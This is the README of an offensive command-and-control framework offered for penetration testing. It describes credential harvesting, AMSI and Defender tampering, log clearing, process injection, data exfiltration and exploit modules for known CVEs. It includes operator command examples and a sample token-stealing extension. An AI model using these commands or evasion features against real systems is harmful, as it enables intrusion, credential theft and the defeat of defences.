<div align="center">

# Megaploit

**Modern Python C2 Framework & Penetration Testing Toolbox**

*A Metasploit-class post-exploitation framework — Python-native, extensible, and built for modern infrastructure.*

[![CI](https://github.com/Josefifir/Megaploit/actions/workflows/ci.yml/badge.svg)](https://github.com/Josefifir/Megaploit/actions/workflows/ci.yml)
[![CodeQL](https://github.com/Josefifir/Megaploit/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/Josefifir/Megaploit/actions/workflows/codeql-analysis.yml)
[![Docs](https://github.com/Josefifir/Megaploit/actions/workflows/docs.yml/badge.svg)](https://josefifir.github.io/Megaploit/)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)](https://python.org)
[![License](https://img.shields.io/github/license/Josefifir/Megaploit)](LICENSE)
[![Tests](https://img.shields.io/badge/tests-553%20passing-brightgreen)](#running-tests)
[![GitHub Stars](https://img.shields.io/github/stars/Josefifir/Megaploit?style=social)](https://github.com/Josefifir/Megaploit/stargazers)

**[📖 Docs](https://josefifir.github.io/Megaploit/) · [🐛 Report Bug](https://github.com/Josefifir/Megaploit/issues/new?template=bug_report.md) · [💡 Request Feature](https://github.com/Josefifir/Megaploit/issues/new?template=feature_request.md) · [📦 Request a Module](https://github.com/Josefifir/Megaploit/issues/new?template=module_request.md)**

</div>

---

> **For authorised security research and penetration testing only.**
> You must have explicit written permission before using this tool against any system.
> Misuse is illegal and unethical. The authors accept no liability.

---

## Why Megaploit?

```
pip install -r requirements.txt
python server.py -lh 10.0.0.1 -p 4444 --tls
```

- 🐍 **Pure Python** — 10× more contributors than Ruby-based frameworks
- 🔒 **AES-256-GCM encrypted transport** with HMAC-SHA256 auth on every connection
- 🪟 **Hardened C Windows agent** ([C-remote-shell](https://github.com/Levon-Volodin/C-remote-shell)) — SChannel TLS, BCrypt GCM, NT syscall post-exploitation
- 🧩 **TOML plugin system** — add new commands without writing Python
- 🏗️ **Metasploit-style module API** — copy a template, fill in the blanks, open a PR
- 📊 **116 session commands** · 20 exploit modules · 8 scanners · 203-tool toolbox

> ⭐ **If Megaploit saves you time on an engagement, a star helps others find it.**

---

## Table of Contents

- [Megaploit](#megaploit)
  - [Why Megaploit?](#why-megaploit)
  - [Table of Contents](#table-of-contents)
  - [What is Megaploit](#what-is-megaploit)
  - [Megaploit vs Metasploit](#megaploit-vs-metasploit)
  - [v4.0 Changelog](#v40-changelog)
    - [New in v4.0 — Advanced Meterpreter-class Shell](#new-in-v40--advanced-meterpreter-class-shell)
      - [`megaploit/agent/meterp.py` — 16 new agent-side post-exploitation handlers](#megaploitagentmeterppy--16-new-agent-side-post-exploitation-handlers)
      - [`megaploit/server/meterp_session.py` — `MeterpreterSession` interactive console](#megaploitservermeterp_sessionpy--meterpretersession-interactive-console)
      - [20 Exploit Modules (`megaploit/modules/exploits/`)](#20-exploit-modules-megaploitmodulesexploits)
      - [Other v4 improvements](#other-v4-improvements)
    - [Previous Systems (v3.x)](#previous-systems-v3x)
  - [Architecture](#architecture)
  - [Requirements](#requirements)
    - [Python Dependencies](#python-dependencies)
  - [Installation](#installation)
    - [Automated (Linux)](#automated-linux)
    - [Manual](#manual)
    - [Docker](#docker)
  - [Quick Start](#quick-start)
  - [Advanced Shell — Meterpreter-class](#advanced-shell--meterpreter-class)
    - [Interactive Console](#interactive-console)
    - [Advanced Post-Exploitation Commands](#advanced-post-exploitation-commands)
      - [Process Migration](#process-migration)
      - [Port Scanner (from target's perspective)](#port-scanner-from-targets-perspective)
      - [PowerShell execution](#powershell-execution)
      - [In-agent Python execution](#in-agent-python-execution)
      - [Runtime Extension Loading](#runtime-extension-loading)
      - [Real PTY Shell](#real-pty-shell)
      - [Screenshot Stream](#screenshot-stream)
  - [Exploit Modules](#exploit-modules)
  - [Server Console](#server-console)
    - [Global Commands](#global-commands)
    - [Module System](#module-system)
    - [Payload Builder](#payload-builder)
    - [Session Commands (full 116-command list)](#session-commands-full-116-command-list)
    - [Operations Commands](#operations-commands)
  - [Toolbox](#toolbox)
  - [Plugin System](#plugin-system)
    - [C-remote-shell Plugin](#c-remote-shell-plugin)
  - [Module System (full reference)](#module-system-full-reference)
    - [Writing a Module](#writing-a-module)
    - [AgentModule — Session-Bound Post Modules](#agentmodule--session-bound-post-modules)
  - [AutoRunScript](#autorunscript)
  - [Post-Exploitation Pipeline](#post-exploitation-pipeline)
  - [Malleable C2 Profile](#malleable-c2-profile)
  - [WebSocket Transport](#websocket-transport)
  - [Jobs System](#jobs-system)
  - [Credential Store](#credential-store)
  - [Reporting](#reporting)
  - [Web Dashboard](#web-dashboard)
  - [Multi-Operator RPC](#multi-operator-rpc)
  - [Go Agent](#go-agent)
  - [Staged Delivery](#staged-delivery)
  - [Security Model](#security-model)
    - [Authentication](#authentication)
    - [Transport Encryption (v2)](#transport-encryption-v2)
    - [TLS](#tls)
    - [Rate Limiter](#rate-limiter)
  - [Wire Protocol](#wire-protocol)
  - [Directory Layout](#directory-layout)
  - [Running Tests](#running-tests)
  - [Contributing](#contributing)
    - [Adding an Exploit Module](#adding-an-exploit-module)
    - [Adding a Meterp Extension](#adding-a-meterp-extension)
    - [Running Tests](#running-tests-1)
  - [Documentation](#documentation)

---

## What is Megaploit

Megaploit is a modular, extensible **Command & Control (C2) framework** and **penetration testing toolbox** written in Python 3.10+. It is designed as a professional-grade alternative to Metasploit for Python-native engagements, now featuring a **Meterpreter-equivalent advanced shell**.

**Core capabilities:**

| Capability | Description |
|---|---|
| **Advanced Meterp Shell** | Meterpreter-class interactive console — tab-complete, session history, auto sysinfo, PTY, background/foreground |
| **20 exploit modules** | SMB, RDP, HTTP, SSH, FTP, Redis — EternalBlue, Log4Shell, BlueKeep, ProxyLogon, Spring4Shell, Heartbleed, vsFTPd, and more |
| **Multi-session C2** | Unlimited simultaneous reverse-shell agents; `use <id>` to switch |
| **AES-256-GCM encrypted transport** | Per-session encrypted channel with sequence numbers and replay protection |
| **WebSocket transport** | HTTP-upgrade WebSocket framing for firewall evasion (port 80/443) |
| **Metasploit-style module system** | `auxiliary`, `exploit`, `post`, `payload` modules with full options lifecycle |
| **AgentModule base class** | Session-bound post-exploitation modules with built-in `_send`, `_upload`, `_download` |
| **8 built-in scanner modules** | TCP port scan, SMB enum, HTTP probe, SSH banner, DNS, ICMP sweep, UDP, banner grab |
| **14-format payload builder** | py / ps1 / hta / vba / sh / bat / exe / elf / go_exe / go_elf / oneliner variants / **py_stealth** + encoder pipeline |
| **Go agent build integration** | `payload go_exe` / `payload go_elf` — compile Go agent via `go build` |
| **Post-exploitation pipeline** | Named collection profiles auto-run on every session |
| **Malleable C2 profile** | YAML traffic shaping — URI rotation, headers, User-Agent, sleep/jitter |
| **203-tool toolbox** | Install any GitHub tool in any language |
| **Plugin system** | TOML plugins add new commands without Python |
| **Dynamic extension loading** | `load_extension` — inject Python modules into the agent at runtime |
| **Process migration** | `migrate <pid>` — move the agent into another running process |
| **Memory R/W** | `memory_read` / `memory_write` — arbitrary process memory access |
| **Real PTY shell** | `interactive` / `pty_shell` — full PTY with resize on Unix, cmd.exe pipe on Windows |
| **Screenshot streaming** | `screenshot_stream <n>` — burst JPEG frames over C2 |
| **SQLite credential + loot DB** | Hosts, services, creds, notes, loot, jobs |
| **Web dashboard** | Flask SSE live dashboard at `http://127.0.0.1:8080` |
| **Multi-operator JSON-RPC** | TCP JSON-RPC 2.0 server for team operations |

---

## Megaploit vs Metasploit

| Category | Megaploit v4 | Metasploit Framework |
|---|---|---|
| **Language / runtime** | Pure Python 3.10+ — single file agent, zero C deps | Ruby + C + native extensions |
| **Agent delivery** | 13 payload formats (py, ps1, hta, vba, sh, bat, exe, elf, Go binary, oneliner…) | Staged/stageless PE/ELF via msfvenom |
| **Encrypted transport** | AES-256-GCM + sequence numbers + WebSocket framing | AES via `--encrypt aes256` (optional) |
| **TLS** | `--tls` auto-cert (self-signed, SHA-256 fingerprint shown); or bring-your-own PEM | Manual cert required |
| **Authentication** | HMAC-SHA256 challenge/response on every connection | No built-in agent authentication |
| **Sessions** | Multi-session, tag + OS column, background/foreground | Multi-session (`sessions -i`) |
| **Shell quality** | PTY + resize, PowerShell exec, in-agent Python exec | Meterpreter PTY |
| **Privilege escalation** | `getsystem` — 3 techniques: **named-pipe impersonation**, SeDebugPrivilege token steal, unquoted service path; `uac_bypass` fodhelper hijack (W10/11); `token_steal`; `dll_inject`; `patch_amsi` | `getsystem` (named pipe + token duplicate + service + more); `bypassuac`; kiwi/mimikatz built-in |
| **Credential harvesting** | `hashdump`, `wifi_passwords`, `cred_vault` (Credential Manager), `browser_creds`, `ssh_harvest`, `sudo_sniff`, `keylog_*` | Mimikatz, hashdump, `post/multi/gather` |
| **Persistence** | `persist`, `startup_items`, `scheduled_tasks`, `keylog_*` | `post/*/manage/persistence` |
| **Post-exploitation** | 116 session commands; SOCKS5 proxy; port-forward; screenshot stream; webcam; DLL inject; AMSI patch; process migration; memory R/W | Meterpreter + post modules |
| **Exploit modules** | 20 modules (EternalBlue, Log4Shell, BlueKeep, ProxyLogon, Spring4Shell, Heartbleed, vsFTPd, Shellshock, PrintNightmare, and more) | 2 000+ modules |
| **Module system** | `auxiliary`, `exploit`, `post`, `payload` with full options lifecycle; `AgentModule` base class | Same architecture (the original) |
| **Evasion** | `patch_amsi`, `disable_defender`, `timestomp`, `clear_logs`, `hide_file`, `living_off_land`; live `etw_patch` + `sandbox_check` session commands; AMSI/ETW baked into PS1/HTA/BAT/oneliner droppers; `py_stealth` format; `sandbox_detect` + `etw_patch` encoders; PE metadata spoofing for EXE builds | Limited built-in; mostly AV-bypass payloads |
| **Toolbox** | 203-tool catalogue — install any GitHub tool in any language | No equivalent |
| **Plugin system** | TOML hot-reload plugins, zero Python required | Metasploit plugins (Ruby) |
| **Malleable C2 profile** | YAML traffic shaping — URI rotation, User-Agent, sleep/jitter | Cobalt Strike concept; not native to Metasploit |
| **Reporting** | Built-in HTML/Markdown/JSON engagement report | `db_export` + community reports |
| **Maturity** | v4 — actively developed, Python-native | 20+ years, battle-tested |

> **Summary:** Megaploit matches Metasploit on all core post-exploitation primitives (multi-technique `getsystem`, token impersonation, UAC bypass, DLL injection, AMSI bypass) and surpasses it on transport security, toolbox breadth, and Python-native extensibility. Metasploit remains ahead on raw exploit count.

---

## v4.0 Changelog

### New in v4.0 — Advanced Meterpreter-class Shell

#### `megaploit/agent/meterp.py` — 16 new agent-side post-exploitation handlers

| Verb | Description |
|---|---|
| `migrate <pid>` | Inject agent into another running process (Windows: `PyRun_SimpleString` remote thread; POSIX: detached subprocess) |
| `memory_read <pid> <addr> <size>` | Read bytes from a remote process's virtual memory via `ReadProcessMemory` (Windows) |
| `memory_write <pid> <addr> <b64>` | Write base64 bytes into a remote process's memory via `WriteProcessMemory` (Windows) |
| `port_scan <host> <ports>` | TCP connect-scan from the target's perspective — 256 concurrent threads, range + list syntax |
| `run_psh <cmd>` | Execute PowerShell with `-ExecutionPolicy Bypass` (Windows) |
| `run_python <code>` | Execute arbitrary Python code inside the agent's interpreter, captures stdout/stderr |
| `load_extension <path>` | Import any Python file or module into the agent at runtime; auto-registers its `HANDLERS` dict |
| `unload_extension <name>` | Remove a loaded extension and deregister all its verbs |
| `list_extensions` | List currently loaded extensions and their registered verbs |
| `screenshot_stream <n> [fps]` | Burst JPEG frames as `FRAME:<b64>` + `STREAM_END` over the C2 channel |
| `pty_shell` | Real PTY via `pty.openpty` (Unix) or `cmd.exe` pipe (Windows) with bidirectional I/O and resize |
| `whoami` | Current user + Administrator/root status in one call |
| `getpid` | Agent's own PID |
| `getuid` | UID / domain\\user details |
| `sleep <secs>` | Operator-controlled jitter sleep (capped at 1 hour) |
| `beacon_sleep <secs>` | Adjust the agent's reconnect delay dynamically |

#### `megaploit/server/meterp_session.py` — `MeterpreterSession` interactive console

- **Tab-completion** via `readline` (gracefully absent on Windows; falls back to plain input)
- **Per-session history** — persisted in `loot/.session_N.history` across reconnects
- **Auto sysinfo** on first attach — populates `session.hostname`, `os_name`, `username` automatically
- **ANSI colour** banner and prompt showing `ip@tag`
- **`background` / Ctrl-Z** — detach without killing the session; re-attach with `sessions -i <id>`
- **`interactive`** — drop into a full PTY with bidirectional I/O and `PTY_RESIZE:<cols>:<rows>` support
- **`stream <n> [fps]`** — pull N JPEG frames, save to `loot/session_N/stream/frame_NNNN.jpg`
- **`sessions`** — tabular view of all active sessions with uptime and OS info

#### 20 Exploit Modules (`megaploit/modules/exploits/`)

| Platform | Module | CVE |
|---|---|---|
| windows/smb | `ms17_010_eternalblue` | CVE-2017-0144 |
| windows/smb | `smb_login_bruteforce` | — |
| windows/smb | `printnightmare_cve2021_1675` | CVE-2021-1675 |
| windows/rdp | `bluekeep_cve2019_0708` | CVE-2019-0708 |
| windows/http | `iis_webdav_cve2017_7269` | CVE-2017-7269 |
| windows/http | `exchange_proxylogon_cve2021_26855` | CVE-2021-26855 |
| windows/ftp | `anon_ftp_deploy` | — |
| linux/ssh | `ssh_login_bruteforce` | — |
| linux/http | `log4shell_cve2021_44228` | CVE-2021-44228 |
| linux/http | `apache_struts_cve2017_5638` | CVE-2017-5638 |
| linux/http | `heartbleed_cve2014_0160` | CVE-2014-0160 |
| linux/redis | `redis_unauth_rce` | CNVD-2015-07557 |
| linux/misc | `sudo_baron_samedit_cve2021_3156` | CVE-2021-3156 |
| multi/handler | `reverse_shell_handler` | — |
| multi/http | `shellshock` | CVE-2014-6271 |
| multi/http | `spring4shell_cve2022_22965` | CVE-2022-22965 |
| multi/http | `wordpress_xmlrpc_bruteforce` | — |
| multi/http | `sql_injection_login_bypass` | — |
| multi/http | `citrix_cve2019_19781` | CVE-2019-19781 |
| multi/ftp | `ftp_vsftpd_backdoor_cve2011_2523` | CVE-2011-2523 |

#### Other v4 improvements

- **MkDocs documentation** deployed to GitHub Pages — `mkdocs.yml`, Material theme, auto-deploy on push to `main`
- **C++ probe support** — `c_probe.py` now covers `.cpp`, `.cc`, `.cxx`, `.hpp` in addition to `.c`/`.h`
- **Registry recursion fix** — `ModuleRegistry.reload()` now uses `os.walk()` for deep subdirectory discovery
- **`datetime.utcnow()` deprecation** — fixed in 8 locations across the codebase (Python 3.12+ compatible)
- **507 tests passing** — 69 new tests covering all meterp handlers, command stubs, and `MeterpreterSession`

### Previous Systems (v3.x)

See [CHANGELOG history](CONTRIBUTING.md) for v3.x changes (AgentModule, Pipeline, WsTransport, Go agent, C-remote-shell).

---

## Architecture

```
Megaploit-main/
├── server.py                    ← Operator entry-point
├── agent.py                     ← Python agent payload
├── secret.key                   ← Shared HMAC secret
├── cert.pem / key.pem           ← TLS certificates (optional)
├── requirements.txt
├── install.sh
│
├── plugins/                     ← TOML plugin files
│   ├── c_remote_shell.toml      ← C-remote-shell plugin descriptor
│   └── c_remote_shell.py        ← C-remote-shell Python handlers
├── tools/                       ← Toolbox: git clones + tools.json
├── loot/                        ← All collected data + audit.log
│
├── tests/                       ← Test suite (pytest · 513 tests)
│
└── megaploit/
    ├── core/
    │   ├── config.py            ← Shared constants
    │   ├── crypto.py            ← HMAC-SHA256 auth
    │   ├── protocol.py          ← AES-256-GCM transport v2 + WsTransport
    │   ├── autorun.py           ← AutoRunScript engine
    │   ├── pipeline.py          ← Post-exploitation pipeline
    │   ├── profile.py           ← Malleable C2 profile
    │   ├── c_probe.py           ← C/C++ source compliance prober + verb extractor
    │   ├── jobs.py              ← Background job manager
    │   └── staging.py           ← Staged payload delivery
    │
    ├── server/
    │   ├── cli.py               ← Interactive console
    │   ├── commands.py          ← 116 session command dispatchers  ← v4: +16 meterp stubs
    │   ├── meterp_session.py    ← Meterpreter-class interactive console  ← NEW v4
    │   ├── listener.py          ← TCP accept + TLS + auth + rate limiter
    │   └── session.py           ← Session dataclass with loot paths
    │
    ├── agent/
    │   ├── connection.py        ← Connect-back loop
    │   ├── handlers.py          ← 90+ victim-side handlers
    │   ├── meterp.py            ← Advanced post-exploitation handlers  ← NEW v4
    │   ├── keylogger.py         ← pynput keystroke logger
    │   ├── shell.py             ← recv → handle → respond loop
    │   └── go_agent/
    │       ├── main.go
    │       └── go.mod
    │
    ├── modules/
    │   ├── base.py              ← Module + AgentModule base classes
    │   ├── registry.py          ← Auto-discovery registry (os.walk recursive)
    │   ├── auxiliary/           ← 8 scanner modules
    │   └── exploits/            ← 20 exploit modules  ← NEW v4
    │       ├── windows/smb/ rdp/ http/ ftp/
    │       ├── linux/ssh/ http/ redis/ misc/
    │       └── multi/handler/ http/ ftp/
    │
    ├── payload/
    │   ├── builder.py           ← 13-format builder + Go/C compilation
    │   └── encoders.py          ← 10-encoder pipeline
    │
    ├── db/ / reporting/ / web/ / streaming/ / toolbox/ / plugins/
```

---

## Requirements

| Requirement | Notes |
|---|---|
| Python 3.10+ | 3.11+ preferred |
| `git` on PATH | For toolbox clone/update |
| Linux / macOS / Windows | Full support |

### Python Dependencies

```bash
pip install -r requirements.txt
```

**Optional (unlocks extra capabilities):**

| Package | Unlocks |
|---|---|
| `cryptography` | AES-256-GCM transport encryption (strongly recommended) |
| `flask` | Web dashboard (`web start`) |
| `impacket` | Full SMB share enumeration + SMB exploit modules |
| `paramiko` | SSH brute-force module |
| `dnspython` | DNS record types beyond A/AAAA |
| `pyinstaller` | `payload exe` / `payload elf` binary compilation |
| `pyyaml` | Full YAML support for C2 profiles |
| `weasyprint` | PDF export from HTML reports |
| `go` (toolchain) | `payload go_exe` / `payload go_elf` Go agent compilation |
| `mss` + `cv2` + `numpy` | High-performance screenshot stream (falls back to `pyautogui`) |
| `pyautogui` | Screenshot fallback (requires display) |

---

## Installation

### Automated (Linux)

```bash
sudo bash install.sh
```

### Manual

```bash
git clone https://github.com/Josefifir/Megaploit.git
cd Megaploit
pip install -r requirements.txt
# Optional extras:
pip install cryptography flask impacket paramiko dnspython pyinstaller pyyaml
```

### Docker

Run Megaploit entirely inside Docker — no Python install required on the host.
All operator state (secret key, loot, tools) persists in a named volume across restarts.

**Requirements:** Docker 20.10+ (or Docker Desktop 4.x+), `docker compose` v2.

```bash
# 1. Build
docker build -t megaploit .

# 2. Build with Go toolchain (enables payload go_exe / go_elf, +~700 MB)
docker build --build-arg INSTALL_GO=1 -t megaploit:full .

# 3. Run interactive console — set LHOST to your reachable LAN/VPN IP
docker run -it --rm \
  -p 4444:4444 -p 8080:8080 -p 7777:7777 \
  -v megaploit-data:/data \
  -e LHOST=192.168.1.10 \
  megaploit

# 4. Docker Compose (recommended for persistent setups)
LHOST=192.168.1.10 docker compose run --rm --service-ports megaploit

# 5. Background listener
LHOST=192.168.1.10 docker compose up -d
```

**Key environment variables:**

| Variable | Default | Description |
|---|---|---|
| `LHOST` | container's first IP | **Required.** Callback IP agents connect back to |
| `PORT` | `4444` | C2 listener port |
| `USE_TLS` | `0` | Set `1` to auto-generate a self-signed cert |

The entrypoint automatically generates `secret.key` on first run, symlinks `loot/`
and `tools/` into `/data`, and detects `cert.pem`/`key.pem` in the volume for TLS.

> **Full Docker reference:** [docs/DOCKER.md](docs/DOCKER.md) — TLS options, volume layout,
> one-off tasks, backup, cross-platform builds, and security notes.

---

## Quick Start

**1 — Generate a shared secret:**

```bash
python3 -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
```

**2 — Start the server:**

```bash
python3 server.py -lh 192.168.1.10 -p 4444
```

**3 — Generate and deploy the Python agent:**

```
megaploit > set lhost 192.168.1.10
megaploit > set port 4444
megaploit > generate
```

Copy `agent.py`, `secret.key`, and the `megaploit/` directory to the target, then run `python3 agent.py`.

**4 — Interact with a session using the advanced shell:**

```
megaploit [1] » use 1

  ╔══════════════════════════════════════════════════╗
  ║  Megaploit Advanced Shell  (Meterpreter-class)   ║
  ╚══════════════════════════════════════════════════╝
  Session  : 1   10.0.0.42:49321
  [*] Gathering target info…
      OS: Windows 10 21H2  Hostname: WORKSTATION-7  User: jdoe

megaploit (10.0.0.42) > sysinfo
megaploit (10.0.0.42) > whoami
megaploit (10.0.0.42) > migrate 1234
megaploit (10.0.0.42) > port_scan 10.0.0.1 22,80,443,3389,8080-8090
megaploit (10.0.0.42) > run_psh "Get-LocalUser | Select Name,Enabled"
megaploit (10.0.0.42) > load_extension /tmp/my_module.py
megaploit (10.0.0.42) > interactive
megaploit (10.0.0.42) > stream 30 10
megaploit (10.0.0.42) > background

megaploit [1] » use auxiliary/scanner/tcp_port
megaploit [1] » setopt RHOSTS 10.0.0.0/24
megaploit [1] » run

megaploit [1] » use exploits/windows/smb/ms17_010_eternalblue
megaploit [1] » setopt RHOSTS 10.0.0.5
megaploit [1] » setopt LHOST 192.168.1.10
megaploit [1] » check
megaploit [1] » run
```

---

## Advanced Shell — Meterpreter-class

### Interactive Console

When you `use <session_id>`, Megaploit drops you into `MeterpreterSession` — a fully interactive Meterpreter-equivalent console.

```
megaploit (10.0.0.42) > help

  COMMAND                                DESCRIPTION
  ──────────────────────────────────────────────────────────────
  background                             Detach session (keep alive)
  interactive                            Drop into real PTY shell
  stream <n> [fps]                       Pull N screenshot frames
  migrate <pid>                          Migrate agent to another process
  memory_read <pid> <addr> <size>        Read process memory
  memory_write <pid> <addr> <b64>        Write process memory
  port_scan <host> <ports>               TCP scan from target perspective
  run_psh <cmd>                          Execute PowerShell one-liner
  run_python <code>                      Execute Python in agent interpreter
  load_extension <path>                  Load a runtime extension module
  unload_extension <name>                Unload a runtime extension
  list_extensions                        List loaded extensions
  screenshot_stream <n> [fps]            Burst JPEG frames over C2
  whoami                                 User + privilege level
  getpid                                 Agent's own PID
  getuid                                 UID / domain\user
  sleep <secs>                           Operator-controlled jitter sleep
  beacon_sleep <secs>                    Adjust beacon reconnect interval
  ... + all 100 standard session commands (type 'help' for full list)
```

**Tab-complete** all 116 command names. **Ctrl-Z** or `background` detaches without killing the session.

### Advanced Post-Exploitation Commands

#### Process Migration

Inject the agent into another running process — useful for operating from a trusted process context or surviving the original process's exit.

```
megaploit (10.0.0.42) > migrate 4832
[+] Migrated to PID 4832 via PyRun_SimpleString remote thread
```

On Windows, a remote thread is created in the target process pointing at `PyRun_SimpleString` (requires the target to have Python loaded — another Python process, or use the detached fallback). On POSIX, spawns a new detached subprocess.

#### Port Scanner (from target's perspective)

Discover services on the internal network that are not reachable from the operator.

```
megaploit (10.0.0.42) > port_scan 10.10.10.0/24 22,80,443,3389,8080-8090
[+] Open ports on 10.10.10.5:
  22      ssh
  80      http
  443     https
  3389    ms-wbt-server
```

Supports comma-separated ports and ranges (`8080-8090`). Up to 256 concurrent threads.

#### PowerShell execution

```
megaploit (10.0.0.42) > run_psh "Get-LocalUser | Where-Object {$_.Enabled -eq $true}"
megaploit (10.0.0.42) > run_psh "Get-Process | Sort-Object CPU -Desc | Select -First 10"
```

Runs with `-ExecutionPolicy Bypass -NonInteractive -NoProfile`.

#### In-agent Python execution

Execute Python snippets directly in the agent's interpreter — useful for quick reconnaissance without writing a full module.

```
megaploit (10.0.0.42) > run_python import os; print([f for f in os.listdir('/etc') if 'pass' in f])
megaploit (10.0.0.42) > run_python import socket; print(socket.gethostbyname('internal-dc.corp'))
```

#### Runtime Extension Loading

Extend the agent's capabilities without restart or redeployment:

```
# On your machine:
cat > /tmp/my_ext.py << 'EOF'
def _steal_tokens(conn, args):
    import subprocess
    return subprocess.check_output(["cmdkey", "/list"], text=True)

HANDLERS = {"steal_tokens": _steal_tokens}
EOF

# Upload and load:
megaploit (10.0.0.42) > upload /tmp/my_ext.py
megaploit (10.0.0.42) > load_extension my_ext.py
[+] Extension 'my_ext' loaded — verbs: steal_tokens
megaploit (10.0.0.42) > steal_tokens
```

#### Real PTY Shell

Drop into a proper interactive terminal with full job control, colours, and resize support.

```
megaploit (10.0.0.42) > interactive
  [*] PTY ready — Ctrl-C to detach
$ whoami
jdoe
$ sudo su -
# id
uid=0(root) gid=0(root) groups=0(root)
# exit
  [*] PTY session ended.
```

#### Screenshot Stream

Pull a rapid burst of screenshots and save them to loot automatically.

```
megaploit (10.0.0.42) > stream 60 15
  1/60 frames received
  ...
  60/60 frames received
[+] 60 frames saved to loot/session_1_10.0.0.42/stream/
```

---

## Exploit Modules

All 20 exploit modules live under `megaploit/modules/exploits/` and are auto-discovered by the registry.

```
megaploit [1] » show modules exploits

  NAME                                          RANK   PLATFORM
  ────────────────────────────────────────────────────────────────────────────
  exploits/windows/smb/ms17_010_eternalblue    600    windows
  exploits/windows/smb/smb_login_bruteforce    300    windows
  exploits/windows/smb/printnightmare_cve...   600    windows
  exploits/windows/rdp/bluekeep_cve2019_0708   600    windows
  exploits/windows/http/iis_webdav_cve2017_..  500    windows
  exploits/windows/http/exchange_proxylogon..  600    windows
  exploits/windows/ftp/anon_ftp_deploy         400    windows/linux
  exploits/linux/ssh/ssh_login_bruteforce      300    linux
  exploits/linux/http/log4shell_cve2021_44228  600    linux/windows/darwin
  exploits/linux/http/apache_struts_cve201...  600    linux
  exploits/linux/http/heartbleed_cve2014_0160  500    linux
  exploits/linux/redis/redis_unauth_rce        500    linux
  exploits/linux/misc/sudo_baron_samedit_...   500    linux
  exploits/multi/handler/reverse_shell_hand..  300    multi
  exploits/multi/http/shellshock               500    multi
  exploits/multi/http/spring4shell_cve2022..   600    multi
  exploits/multi/http/wordpress_xmlrpc_bru..   400    multi
  exploits/multi/http/sql_injection_login_..   400    multi
  exploits/multi/http/citrix_cve2019_19781     600    multi
  exploits/multi/ftp/ftp_vsftpd_backdoor_..    600    linux
```

**Usage:**

```
megaploit [1] » use exploits/linux/http/log4shell_cve2021_44228
megaploit [module] » setopt RHOSTS 10.0.0.50
megaploit [module] » setopt LHOST 192.168.1.10
megaploit [module] » check
[+] 10.0.0.50:8080 — JNDI injection point confirmed (HTTP 200)
megaploit [module] » run
[+] Done — payload sent to 1/1 host(s)
[+] CONFIRMED callbacks from: 10.0.0.50
```

---

## Server Console

```bash
python3 server.py -lh <callback-ip> -p <port> [options]

  -lh, --lhost       IP the agent connects back to (required)
  -p,  --port        TCP port (required)
  -rh, --rhost       Bind IP (default: 0.0.0.0)
  --cert             SSL certificate PEM — enables TLS 1.2+
  --key              SSL private key PEM
  --secret           Path to secret.key (default: secret.key)
  --allow-ip <IP>    Allowlisted source IP (repeat for multiple)
  --auto-update      Auto-apply tool updates in background
```

### Global Commands

| Command | Description |
|---|---|
| `sessions` | List active sessions (ID, IP, OS, hostname, tag, uptime) |
| `use <id>` | Enter **MeterpreterSession** interactive console |
| `use <module/path>` | Load a module |
| `generate [-c] [--tls]` | Patch agent with LHOST/PORT |
| `set <option> <value>` | Set lhost / port / cert / key |
| `tls auto` | Auto-generate self-signed cert and enable TLS |
| `tls regen` | Force-regenerate the auto cert |
| `tls status` | Show TLS mode, cert path, and SHA-256 fingerprint |
| `show modules [query]` | Browse loaded module catalogue |
| `run` / `check` / `info` | Execute / pre-check / describe active module |
| `broadcast <cmd>` | Run shell command on ALL active sessions |
| `payload <format> [opts]` | Build payload |
| `stage0 generate [opts]` | Generate stage-0 dropper |
| `pipeline enable\|disable <profile>` | Toggle post-exploitation collection profile |
| `web start\|stop\|status` | Manage web dashboard |
| `rpc start\|stop\|status` | Manage multi-operator RPC |
| `jobs list\|kill <id>` | Background job management |
| `creds show\|search\|export` | Credential store |
| `report html\|json [output]` | Generate engagement report |
| `toolbox …` | Tool installer |
| `loot browse\|export` | Loot file browser |

### Module System

```
megaploit [1] » use auxiliary/scanner/tcp_port
megaploit [1] » setopt RHOSTS 10.0.0.0/24
megaploit [1] » setopt PORTS 22,80,443,3306,8080
megaploit [1] » run
```

### Payload Builder

```
megaploit [1] » payload help

  Formats: py  ps1  hta  vba  sh  bat  raw  exe  elf  go_exe  go_elf  oneliner_py  oneliner_ps1  py_stealth

megaploit [1] » payload go_exe --out agent.exe
megaploit [1] » payload ps1 --encoder comment_spam --encoder varname_rand --out obf.ps1
```

### Session Commands (full 116-command list)

| Category | Commands |
|---|---|
| **Core** | sysinfo, cd, shell, exit, whoami, getpid, getuid |
| **File** | upload, download, zip_download, zip_upload, ls, cat, find_files, find_writable, find_suid, file_hash, tail, write_file, mkdir, rm, chmod, search |
| **Screen/Audio** | screenshot, screenshot_region, screenshot_timelapse, screenshot_stream, record, mic_level, screen_stream, webcam, screenrecord |
| **Persistence** | persist, keylog_start, keylog_dump, keylog_stop, startup_items, scheduled_tasks |
| **Creds** | hashdump, wifi_passwords, browser_creds, browser_history, cred_vault, ssh_harvest, sudo_sniff |
| **Clipboard** | getclip, setclip, clip_watch |
| **Network** | portfwd, arp, dns_query, routes, ifconfig, netstat, ping_sweep, smb_shares, ssh_connect, rdp_enable, socks5, port_scan |
| **Exfil** | exfil_dns, exfil_http |
| **Privesc** | token_steal, uac_bypass, make_token, rev2self, getsystem, whoami_priv |
| **Evasion** | lock_screen, patch_amsi, disable_defender, hide_file, timestomp, clear_logs, **etw_patch**, **sandbox_check** |
| **Injection** | inject_shellcode, dll_inject, living_off_land, reverse_shell |
| **GUI** | msgbox, mouse_move, type_keys, screenshot_region, notify, open_url, play_sound, set_wallpaper |
| **Intelligence** | ps, kill, env, installed_software, active_windows, services, users, logged_in, os_info, idle_time |
| **Advanced** | migrate, memory_read, memory_write, run_psh, run_python, load_extension, unload_extension, list_extensions, sleep, beacon_sleep, interactive |
| **Loot** | loot_list, note, notes |
| **Staging** | load_stage |
| **Destructive** | forkbomb, self_destruct |

### Operations Commands

```
megaploit [1] » pipeline enable creds
megaploit [1] » stage0 generate --start
megaploit [1] » jobs list
megaploit [1] » report html pentest.html
megaploit [1] » web start --port 8080
```

---

## Toolbox

```
megaploit > toolbox install <repo_url> <name> [desc]
megaploit > toolbox catalogue [query]
megaploit > toolbox list
megaploit > toolbox update <name>
megaploit > toolbox healthcheck [name]
```

